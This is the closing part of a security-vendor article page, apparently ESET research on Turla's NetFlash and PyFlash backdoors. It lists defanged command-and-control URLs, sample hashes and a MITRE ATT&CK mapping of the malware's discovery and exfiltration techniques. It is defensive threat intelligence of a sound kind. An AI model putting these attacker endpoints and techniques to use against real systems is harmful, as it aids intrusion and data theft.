<li><span style="font-family: courier new, courier, monospace;">http://134.209.222[.]206:15363</span></li>
<li><span style="font-family: courier new, courier, monospace;">http://85.222.235[.]156:8000</span></li>
</ul>
<h3>Samples</h3>

<table id="tablepress-805" class="tablepress tablepress-id-805">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Timestamp</th><th class="column-3">Description</th><th class="column-4">ESET Detection Name</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">973620A7AB28A2CBA82DC2A613CD24ED43734381</td><td class="column-2">Thu Aug 29 04:14:46 UTC 2019</td><td class="column-3">NetFlash Dropper</td><td class="column-4">MSIL/Turla.D</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">B6567F988C9ACC5DF3CBD72409FC70D54EA412BB</td><td class="column-2">Tue Sep  3 11:12:04 UTC 2019</td><td class="column-3">NetFlash</td><td class="column-4">MSIL/Turla.D</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">9F81710B85AA7088505C1EECCE9DA94A39A2DC06</td><td class="column-2">Thu Aug 29 04:12:33 UTC 2019</td><td class="column-3">NetFlash</td><td class="column-4">MSIL/Turla.F</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">32430B11E42EDEB63A11E721927FFBABE7C9CFEA</td><td class="column-2">N/A</td><td class="column-3">PyFlash</td><td class="column-4">Win32/Turla.EM</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">620A669EC0451C9F079FB4731F254AC577902E5E</td><td class="column-2">Wed Aug 29 09:43:18 UTC 2018</td><td class="column-3">Skipper communication DLL</td><td class="column-4">Win32/Turla.EJ</td>
</tr>
</tbody>
</table>

<h2>MITRE ATT&amp;CK techniques</h2>

<table id="tablepress-806" class="tablepress tablepress-id-806">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Initial Access</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1189/" rel="noopener" target="_blank">T1189</a></td><td class="column-3">Drive-by Compromise</td><td class="column-4">Turla compromised high-value websites to deliver malware to the visitors.</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1204/" rel="noopener" target="_blank">T1204</a></td><td class="column-3">User Execution</td><td class="column-4">A fake Flash installer is intended to trick the user into launching the malware.</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1053/" rel="noopener" target="_blank">T1053</a></td><td class="column-3">Scheduled Task</td><td class="column-4">NetFlash and PyFlash persist using scheduled tasks.</td>
</tr>
<tr class="row-5 odd">
	<td rowspan="3" class="column-1">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1016/" rel="noopener" target="_blank">T1016</a></td><td class="column-3">System Network Configuration Discovery</td><td class="column-4">PyFlash executes <span style="font-family: courier new, courier, monospace;"> ipconfig /all</span>,<span style="font-family: courier new, courier, monospace;"> getmac </span> and <span style="font-family: courier new, courier, monospace;"> arp -a</span></td>
</tr>
<tr class="row-6 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1057/" rel="noopener" target="_blank">T1057</a></td><td class="column-3">Process Discovery</td><td class="column-4">PyFlash executes <span style="font-family: courier new, courier, monospace;"> tasklist</span></td>
</tr>
<tr class="row-7 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank">T1082</a></td><td class="column-3">System Information Discovery</td><td class="column-4">PyFlash executes <span style="font-family: courier new, courier, monospace;"> systeminfo</span></td>
</tr>
<tr class="row-8 even">
	<td rowspan="4" class="column-1">Command and Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1032/" rel="noopener" target="_blank">T1032</a></td><td class="column-3">Standard Cryptographic Protocol</td><td class="column-4">PyFlash uses AES-128 in CBC mode to encrypt C&amp;C communications.</td>
</tr>
<tr class="row-9 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1043/" rel="noopener" target="_blank">T1043</a></td><td class="column-3">Commonly Used Port</td><td class="column-4">NetFlash uses port 80.</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1065/" rel="noopener" target="_blank">T1065</a></td><td class="column-3">Uncommonly Used Port</td><td class="column-4">PyFlash uses port 8,000. <br />
A NetFlash sample uses port 15,363.</td>
</tr>
<tr class="row-11 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1071/" rel="noopener" target="_blank">T1071</a></td><td class="column-3">Standard Application Layer Protocol</td><td class="column-4">NetFlash and PyFlash use HTTP.</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">Exfiltration</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1041/" rel="noopener" target="_blank">T1041</a></td><td class="column-3">Exfiltration Over Command and Control Channel</td><td class="column-4">The output of PyFlash surveillance and C&amp;C commands are exfiltrated using the C&amp;C protocol.</td>
</tr>
</tbody>
</table>

<p>&nbsp;</p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2020-03-12 11:30:45">12 Mar 2020 - 11:30AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Tracking Turla: New backdoor delivered via Armenian watering holes">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="Tracking Turla: New backdoor delivered via Armenian watering holes">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="Tracking Turla: New backdoor delivered via Armenian watering holes">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="Tracking Turla: New backdoor delivered via Armenian watering holes">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F12%2Ftracking-turla-new-backdoor-armenian-watering-holes%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F12%2Ftracking-turla-new-backdoor-armenian-watering-holes%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F12%2Ftracking-turla-new-backdoor-armenian-watering-holes%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"135724 https:\/\/backend.welivesecurity.com\/?p=135724","disqusShortname":"welivesecurity","disqusTitle":"Tracking Turla: New backdoor delivered via Armenian watering holes","disqusUrl":"https:\/\/www.welivesecurity.com\/2020\/03\/12\/tracking-turla-new-backdoor-armenian-watering-holes\/","postId":"135724"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>